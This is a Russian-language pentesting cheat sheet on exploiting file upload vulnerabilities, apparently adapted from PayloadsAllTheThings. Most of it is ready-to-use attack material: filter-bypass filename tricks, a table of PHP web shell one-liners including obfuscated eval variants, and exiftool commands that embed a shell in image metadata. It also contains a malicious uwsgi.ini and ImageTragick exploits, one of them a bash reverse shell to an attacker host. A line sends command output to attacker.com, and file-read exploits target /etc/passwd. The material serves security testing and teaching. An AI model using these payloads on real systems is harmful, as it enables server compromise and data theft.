* [Инструменты](#Инструменты)
* [Методология](#Методология)
    * [Стандартные расширения](#Стандартные-расширения)
    * [Уловки загрузки](#Уловки-загрузки)
    * [Уязвимости имени файла](#Уязвимости-имени-файла)
    * [Сжатие изображений](#Сжатие-изображений)
    * [Метаданные изображений](#Метаданные-изображений)
    * [Файлы конфигурации](#Файлы-конфигурации)
    * [CVE - ImageMagick](#CVE---ImageMagick)
    * [CVE - FFMpeg HLS](#CVE---FFMpeg-HLS)
* [URL](#URL)

> Загружаемые файлы могут представлять значительный риск при неправильной обработке. Пользователь может отправить POST-запрос multipart/form-data со специально созданным именем файла или MIME-типом и выполнить произвольный код.
>> Возникает из-за неправильной проверки и фильтрации загружаемых файлов на стороне сервера. Например, если сервер не определяет тип, расширение, размер и наличие исполняемого кода в файле.
В некоторых случаях сам факт загрузки файла может быть достаточным для нанесения ущерба. Другие атаки могут включать последующий HTTP-запрос на файл, как правило, для запуска его выполнения сервером.


# Инструменты

* [almandin/fuxploider](https://github.com/almandin/fuxploider) - Сканер уязвимостей загрузки файлов и инструмент эксплуатации.
* [Burp/Upload Scanner](https://portswigger.net/bappstore/b2244cbb6953442cb3c82fa0a0d908fa) - Сканер загрузки HTTP-файлов для Burp Proxy.
* [ZAP/FileUpload](https://www.zaproxy.org/blog/2021-08-20-zap-fileupload-addon/) - Дополнение OWASP ZAP для поиска уязвимостей в функциональности загрузки файлов.

# Методология

* Влияние уязвимостей загрузки файлов обычно зависит от двух ключевых факторов:
   * Какой аспект файла веб-сайт не может проверить должным образом, будь то его размер, тип, содержимое и т. д.
   * Какие ограничения налагаются на файл после его успешной загрузки.

## **Стандартные расширения**

Вот список стандартных расширений для веб-шеллов на выбранных языках (PHP, ASP, JSP).

* PHP Сервер
```
.php
.php3
.php4
.php5
.php7

# Менее известные расширения PHP
.pht
.phps
.phar
.phpt
.pgif
.phtml
.phtm
.inc
.shtml
.htaccess
.hphp
.ctp
.module
```

* ASP Сервер
```
.asp
.aspx
.config
.cer # (IIS <= 7.5)
.asa # (IIS <= 7.5)
shell.aspx;1.jpg # (IIS < 7.0)
shell.soap
```
* JSP: ```.jsp```, ```.jspx```, ```.jsw```, ```.jsv```, ```.jspf```, ```.wss```, ```.do```, ```.actions```
* Perl: ```.pl```, ```.pm```, ```.cgi```, ```.lib```
* Coldfusion: ```.cfm```, ```.cfml```, ```.cfc```, ```.dbm```
* Node.js: ```.js```, ```.json```, ```.node```

* Другие расширения, которые можно использовать для запуска других уязвимостей.

* ```.svg```: XXE, XSS, SSRF
* ```.gif```: XSS
* ```.csv```: Инъекция CSV
* ```.xml```: XXE
* ```.avi```: LFI, SSRF
* ```.js``` : XSS, Открытое перенаправление
* ```.zip```: RCE, DOS, LFI Gadget
* ```.html``` : XSS, Открытое перенаправление

## **Уловки загрузки**

> В качестве меры предосторожности серверы обычно запускают только те скрипты, MIME-тип которых был явно настроен на выполнение. Такая конфигурация часто различается между каталогами. Каталог, в который загружаются предоставленные пользователем файлы, скорее всего, будет иметь гораздо более строгий контроль, чем другие расположения в файловой системе, которые, как предполагается, недоступны для конечных пользователей.
>> Веб-серверы часто используют поле имени файла в запросах multipart/form-data для определения имени и места сохранения файла.

**Расширения**:

* Используй двойные расширения: ```.jpg.php, .png.php, .jpeg.html```

* Используй обратное двойное расширение (полезно для эксплуатации неправильных конфигураций Apache, где выполняется код с расширением .php, но не обязательно заканчивающимся на .php): .php.jpg

* Случайный верхний и нижний регистр: ```.pHp, .pHP5, .PhAr```

* Null byte (хорошо работает против pathinfo())
     * ```.php%00.gif```
     * ```.php\x00.gif```
     * ```.php%00.png```
     * ```.php\x00.png```
     * ```.php%00.jpg```
     * ```.php\x00.jpg```
     * ```.php#.png```
     * ```.php%0a.png```
     * ```.php%0d%0a.png```

* Специальные символы
        * Несколько точек: ```file.php......``` , в Windows при создании файла с точками в конце они будут удалены.
        * Добавить конечные символы. Некоторые компоненты будут удалять или игнорировать конечные пробелы, точки и тому подобное: ```Exploit.php. ```
        * Пробелы и символы новой строки
            * ```file.php%20```
            * ```file.php%0d%0a.jpg```
            * ```file.php%0a```
        * Переопределение справа налево (RTLO - символ Unicode U+202E "Переопределение справа налево". Его URL-кодированная версия: %E2%80%AE): ```name.%E2%80%AEphp.jpg``` превратится в ```name.gpj.php```. 
        * Слеш: ```file.php/```, ```file.php.\```, ```file.j\sp```, ```file.j/sp```
        * Несколько специальных символов: ```file.jsp/././././.```

* В ОС Windows функции include, require и require_once преобразуют "foo.php", за которым следует один или несколько символов \x20 ( ), \x22 ("), \x2E (.), \x3C (<), \x3E (>), обратно в "foo.php".

* В ОС Windows функция fopen преобразует "foo.php", за которым следует один или несколько символов \x2E (.), \x2F (/), \x5C (\), обратно в "foo.php".

* В ОС Windows функция move_uploaded_file преобразует "foo.php", за которым следует один или несколько символов \x2E (.), \x2F (/), \x5C (\), обратно в "foo.php".

* В ОС Windows при запуске PHP на IIS некоторые символы автоматически преобразуются в другие при сохранении файла (например, web<< становится web** и может заменить web.config).
      \x3E (>) преобразуется в \x3F (?)
      \x3C (<) преобразуется в \x2A (*)
      \x22 (") преобразуется в \x2E (.), чтобы использовать этот трюк в запросе на загрузку файла, в заголовке "Content-Disposition" следует использовать одинарные кавычки (например, filename='web"config').

* Выявить лимит на длину имени ```veerrryyy_loonnggg_naaamme.php.png```

* использовать многобайтовые символы Unicode, которые могут быть преобразованы в нулевые байты и точки после преобразования Unicode или нормализации
xC0 x2E, xC4 xAE или xC0 xAE, могут быть преобразованы в x2E, если имя файла проанализировано как строка UTF-8, но затем преобразовано в символы ASCII перед использованием в пути.

* Добавить точки с запятой или URL-кодированные нулевые байтовые символы перед расширением файла. Если проверка написана на языке высокого уровня, таком как PHP или Java, но сервер обрабатывает файл с помощью функций более низкого уровня в C/C++
```
Exploit.asp;.jpg 
Exploit.asp%00.jpg
```
* Другие способы защиты включают удаление или замену опасных расширений, чтобы предотвратить выполнение файла.
```
exploit.p.phphp - .php = exploit.php
```

**Идентификация файла**: 

> MIME-тип - это стандартизированный идентификатор, который сообщает браузерам, серверам и приложениям, с каким типом файла или данных происходит работа. Он состоит из типа и подтипа, разделенных косой чертой. Измените Content-Type: application/x-php или Content-Type: application/octet-stream на Content-Type: image/gif, чтобы замаскировать содержимое под изображение.

* Распространенные content-types для изображений:
```
Content-Type: image/gif
Content-Type: image/png
Content-Type: image/jpeg
```

* Wordlist для Content-Type: SecLists/web-all-content-types.txt

```
text/php
text/x-php
application/php
application/x-php
application/x-httpd-php
application/x-httpd-php-source
```

* Установите Content-Type дважды: один раз для запрещенного типа и один раз для разрешенного.

* [Магические байты](https://ru.wikipedia.org/wiki/%D0%A1%D0%BF%D0%B8%D1%81%D0%BE%D0%BA_%D1%81%D0%B8%D0%B3%D0%BD%D0%B0%D1%82%D1%83%D1%80_%D1%84%D0%B0%D0%B9%D0%BB%D0%BE%D0%B2) - Иногда приложения идентифицируют типы файлов на основе их первых сигнатурных байтов. Добавление/замена их в файле может обмануть приложение.

```
    PNG: \x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[
    JPG: \xff\xd8\xff
    GIF: GIF87a ИЛИ GIF8;
```

**Инкапсуляция файлов**:

* ADS (Alternate Data Stream) — скрытые "отсеки" внутри файлов. ("документ внутри документа")
    * Двоеточие : — это как команда Windows: "Создай скрытый отсек внутри файла"
  
> Использование альтернативного потока данных (ADS) NTFS в Windows. В этом случае символ двоеточия ":" будет вставлен после запрещенного расширения и перед разрешенным.
>> В результате на сервере будет создан пустой файл с запрещенным расширением (например, "file.asax:.jpg"). Этот файл можно позже отредактировать, используя другие методы, такие как использование его короткого имени.
>>> Шаблон "::$data" также можно использовать для создания непустых файлов. Поэтому добавление точки после этого шаблона также может быть полезно для обхода дальнейших ограничений (например, "file.asp::$data.").
    
**Другие методы**:

* PHP-веб-шеллы не всегда имеют тег <?php, вот некоторые альтернативы:
_____________________________________________
***Таблица вариантов для обхода фильтров***

| Тип | Код | Примечания |
|-----|-----|------------|
| **Script Tag** | ```<script language="php">system("id");</script>``` | Историческая поддержка |
| **Short Echo** | ```<?=`$_GET[0]`?>``` | Сокращенный синтаксис вывода |
| **Short Tags** | ```<? system('id'); ?>``` | Требует short_open_tag=On |
| **Short Tags Multi** | ```<? echo `whoami`; ?>``` | Многострочный вариант |
| **Type Attribute** | ```<script type="text/php">system($_GET['cmd']);</script>``` | Альтернативный атрибут |
| **Short Echo Commands** | ```<?=`id`?>``` | Прямое выполнение команды |
| **Short Echo System** | ```<?=system($_GET[0])?>``` | Через system() |
| **Short Echo ShellExec** | ```<?=shell_exec('cat /etc/passwd')?>``` | Через shell_exec() |
| **Short Echo Exec** | ```<?=exec('whoami')?>``` | Через exec() |
| **Short Echo PassThru** | ```<?=passthru('ls -la')?>``` | Через passthru() |
| **HTML Combination** | ```<?='<pre>'.shell_exec('id').'</pre>'?>``` | С HTML-форматированием |
| **Directory Listing** | ```<?=print_r(scandir('.'),true)?>``` | Листинг директории |
| **ASP Tags** | ```<% system('id'); %>``` | Требует asp_tags=On |
| **Multiline Short** | ```<? if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?>``` | Условное выполнение |
| **Backticks Echo** | ```<? echo `id`; ?>``` | Бэктики с echo |
| **Eval** | ```<?=eval($_GET['c'])?>``` | Выполнение через eval() |
| **Assert** | ```<?=assert($_POST['x'])?>``` | Выполнение через assert() |
| **Create Function** | ```<?=create_function('',$_REQUEST['code'])()?>``` | Через create_function() |
| **Data Wrapper** | ```<?=include('data://text/plain;base64,'.base64_encode($_POST['c']))?>``` | Через data:// wrapper |
| **Web Server** | ```<?='<pre>'.`$_GET[c]`.''?>``` | Для встроенного сервера |
| **Case Variation** | ```<?=SYSTEM($_GET[0])?>``` | Изменение регистра |
| **Mixed Case** | ```<?=sYsTeM('id')?>``` | Смешанный регистр |
| **String Concatenation** | ```<?='sy'.'stem'('id')?>``` | Конкатенация строк |
| **Variable Function** | ```<?=$_=system;$_('id')?>``` | Через переменную |

**Примеры использования для разных задач**

1. Получение информации о системе
```php
<?=`uname -a`?>
<?=phpinfo()?>
<?=print_r($_SERVER,true)?>
```
2. Чтение файлов
```php
<?=file_get_contents('/etc/passwd')?>
<?=readfile('/etc/passwd')?>
<?=highlight_file('/etc/passwd')?>
```
3. Запись файлов
```php
<?=file_put_contents('shell.php','<?php system($_GET[0]);?>')?>
```
4. Сетевые операции
```php
<?=file_get_contents('http://attacker.com/'.`whoami`)?>
```
5. Обход WAF/фильтров
5.1 Разделение строк
```php
<?=$a='sy'.$b='stem';$a($c='id')?>
```
5.2 Base64 кодирование
```php
<?=eval(base64_decode('c3lzdGVtKCJpZCIpOw=='))?>
```
5.3 Hex кодирование
```php
<?=eval(hex2bin('73797374656d2822696422293b'))?>
```
5.4 Через массив
```php
<?=array_map('assert',array($_POST['x']))?>
```

* Важные примечания
   * short_open_tag - должен быть включен в php.ini для <? ?>
   * asp_tags - должен быть включен для <% %>
   * Бэктики (``) - выполняют shell-команды
   * Доступ к функциям - зависит от настроек disable_functions
_______________________________________

## **Уязвимости имени файла**

Иногда уязвимость заключается не в загрузке, а в том, как файл обрабатывается после. Можно попробовать загрузить файлы с полезными нагрузками в имени файла.

* Полезные нагрузки Time-Based SQLi: например, ```poc.js'(select*from(select(sleep(20)))a)+'.extension```
* Полезные нагрузки LFI/Path Traversal: например, ```image.png../../../../../../../etc/passwd```
* Полезные нагрузки XSS: например, ```'"><img src=x onerror=alert(document.domain)>.extension```
* Обход файловой системы: например, ```../../../tmp/lol.png```
* Инъекция команд: например, ```; sleep 10;```

Также можно загрузить:

* HTML/SVG файлы для запуска XSS
* Файл EICAR для проверки наличия антивируса
   * ```X5O!P%@AP_EICAR_TEST.jpg``` 

### Сжатие изображений

Создай валидные изображения, содержащие PHP-код. Загрузи изображение и используй Local File Inclusion для выполнения кода. Шелл можно вызвать следующей командой: ```curl 'http://localhost/test.php?0=system' --data "1='ls'"```.

* Метаданные изображения - скрыть полезную нагрузку внутри тега комментария в метаданных.
* Изменение размера изображения - скрыть полезную нагрузку в алгоритме сжатия, чтобы обойти изменение размера. Также обходит getimagesize() и imagecreatefromgif().
   * [JPG](https://virtualabs.fr/Nasty-bulletproof-Jpegs-l): используйте createBulletproofJPG.py
   * [PNG](https://blog.isec.pl/injection-points-in-popular-image-formats/): используйте createPNGwithPLTE.php
   * [GIF](https://blog.isec.pl/injection-points-in-popular-image-formats/): используйте createGIFwithGlobalColorTable.php

### Метаданные изображений

* Создайте пользовательское изображение и вставьте тег exif с помощью exiftool. Список нескольких тегов exif можно найти на [exiv2.org](https://exiv2.org/tags.html)
```bash
convert -size 110x110 xc:white payload.jpg
exiftool -Copyright="PayloadsAllTheThings" -Artist="Pentest" -ImageUniqueID="Example" payload.jpg
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
```

### Файлы конфигурации

> Многие серверы также позволяют разработчикам создавать специальные файлы конфигурации в отдельных каталогах, чтобы переопределить или добавить один или несколько глобальных параметров. Например, серверы Apache будут загружать конфигурацию, специфичную для каталога, из файла .htaccess, если он присутствует.

Если пытаешься загрузить файлы на:

* PHP сервер, посмотри на трюк с [.htaccess](https://github.com/Kaupervud69/WebVuln/tree/main/File%20upload/Apache%20.htaccess%20config) для выполнения кода.
* ASP сервер, посмотри на трюк с [web.config для](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config) выполнения кода.
* uWSGI сервер, посмотри на трюк с [uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini) для выполнения кода.

* Примеры файлов конфигурации
   * Apache: [.htaccess](https://github.com/Kaupervud69/WebVuln/tree/main/File%20upload/Apache%20.htaccess%20config)
   * IIS: [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)
   * Python: [__init__.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20Python%20__init__.py/python-generate-init.py)
   * WSGI: [uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini)

**Apache: .htaccess**

Директива AddType в файле .htaccess используется для указания MIME-типа для разных расширений файлов на сервере Apache HTTP. Эта директива помогает серверу понять, как обрабатывать разные типы файлов и какой тип контента с ними связывать при передаче клиентам (таким как веб-браузеры).

Вот базовый синтаксис директивы AddType:
```
AddType mime-type extension [extension ...]
```
Эксплуатируйте директиву AddType, загрузив файл .htaccess со следующим содержимым.
```
AddType application/x-httpd-php .rce
```
Затем загрузите любой файл с расширением ```.rce.```

**WSGI: uwsgi.ini**

Файлы конфигурации uWSGI могут включать «магические» переменные, заполнители и операторы, определенные с точным синтаксисом. Оператор ‘@’, в частности, используется в форме @(filename) для включения содержимого файла. Поддерживается множество схем uWSGI, включая “exec” - полезно для чтения из стандартного вывода процесса. Эти операторы можно использовать для удаленного выполнения команд или произвольной записи/чтения файлов, когда анализируется файл конфигурации .ini:

Пример вредоносного файла uwsgi.ini:
```
[uwsgi]
; чтение из символа
foo = @(sym://uwsgi_funny_function)
; чтение из добавленных бинарных данных
bar = @(data://[REDACTED])
; чтение из http
test = @(http://[REDACTED])
; чтение из файлового дескриптора
content = @(fd://[REDACTED])
; чтение из stdout процесса
body = @(exec://whoami)
; вызов функции, возвращающей char *
characters = @(call://uwsgi_func)
```

Когда файл конфигурации будет разобран (например, перезапуск, сбой или авто-перезагрузка), полезная нагрузка будет выполнена.

**Менеджер зависимостей**

В качестве альтернативы можно попробовать загрузить JSON-файл с пользовательскими скриптами и попытаться перезаписать файл конфигурации менеджера зависимостей.

* package.json
```
    "scripts": {
        "prepare" : "/bin/touch /tmp/pwned.txt"
    }
```

* composer.json
```
"scripts": {
    "pre-command-run" : [
    "/bin/touch /tmp/pwned.txt"
    ]
}
```

## CVE - ImageMagick

> Если бэкенд использует ImageMagick для изменения размера/конвертации пользовательских изображений, вы можете попробовать эксплуатировать известные уязвимости, такие как ImageTragik.

**CVE-2016–3714 - ImageTragik**

Загрузите это содержимое с расширением изображения, чтобы эксплуатировать уязвимость (ImageMagick , 7.0.1-1)

* ImageTragik - пример #1
```python
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
* ImageTragik - пример #2
```python
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
```

Уязвимость может быть вызвана с помощью команды ```convert```.
```
convert shellexec.jpeg whatever.gif
```

**CVE-2022-44268**

> CVE-2022-44268 - это уязвимость раскрытия информации, обнаруженная в ImageMagick. Пользователь может эксплуатировать это, создав вредоносный файл изображения, который при обработке ImageMagick может раскрыть информацию из локальной файловой системы сервера, на котором работает уязвимая версия программного обеспечения.

* Сгенерируйте полезную нагрузку
```bash
apt-get install pngcrush imagemagick exiftool exiv2 -y
pngcrush -text a "profile" "/etc/passwd" exploit.png
```
* Вызовите эксплойт, загрузив файл. Бэкенд может использовать что-то вроде convert pngout.png pngconverted.png

* Скачайте преобразованное изображение и проверьте его содержимое с помощью: identify -verbose pngconverted.png

* Преобразуйте эксфильтрованные данные: python3 -c 'print(bytes.fromhex("HEX_FROM_FILE").decode("utf-8"))'

Больше полезных нагрузок в папке [Picture ImageMagick](https://github.com/Kaupervud69/WebVuln/tree/main/File%20upload/Picture%20ImageMagick).

### CVE - FFMpeg HLS

> FFmpeg - это открытое программное обеспечение, используемое для обработки аудио и видео форматов. Можно использовать вредоносный плейлист HLS внутри видео AVI для чтения произвольных файлов.

1. ./gen_xbin_avi.py file://<имя_файла> file_read.avi
2. Загрузите file_read.avi на какой-нибудь сайт, который обрабатывает видеофайлы
3. На стороне сервера, выполняется видеосервисом: ffmpeg -i file_read.avi output.mp4
4. Нажмите "Play" в видеосервисе.
5. Если вам повезет, вы увидите содержимое <имя_файла> с сервера.

Скрипт создает AVI, который содержит плейлист HLS внутри GAB2. Плейлист, сгенерированный этим скриптом, выглядит так:
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:1.0
GOD.txt
#EXTINF:1.0
/etc/passwd
#EXT-X-ENDLIST
```
Больше полезных нагрузок в папке [FFmpeg HLS](https://github.com/Kaupervud69/WebVuln/tree/main/File%20upload/FFmpeg%20HLS).


# URL

* [new-vector-for-dirty-arbitrary-file-write-2-rce](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
* [Arbitrary-File-Upload-Tricks-In-Java](https://blog.pyn3rd.com/2022/05/07/Arbitrary-File-Upload-Tricks-In-Java/)
* [hacktricks pentesting-web/file-upload](https://book.hacktricks.xyz/pentesting-web/file-upload)
* [initial-access/webshells/iis-soap](https://red.0xbad53c.com/red-team-operations/initial-access/webshells/iis-soap)
* [inyeccion-de-codigo-en-imagenes-php-gd](https://www.hackplayers.com/2020/03/inyeccion-de-codigo-en-imagenes-php-gd.html)
* [insomnihack-teaser-2019/l33t-hoster](https://corb3nik.github.io/blog/insomnihack-teaser-2019/l33t-hoster)
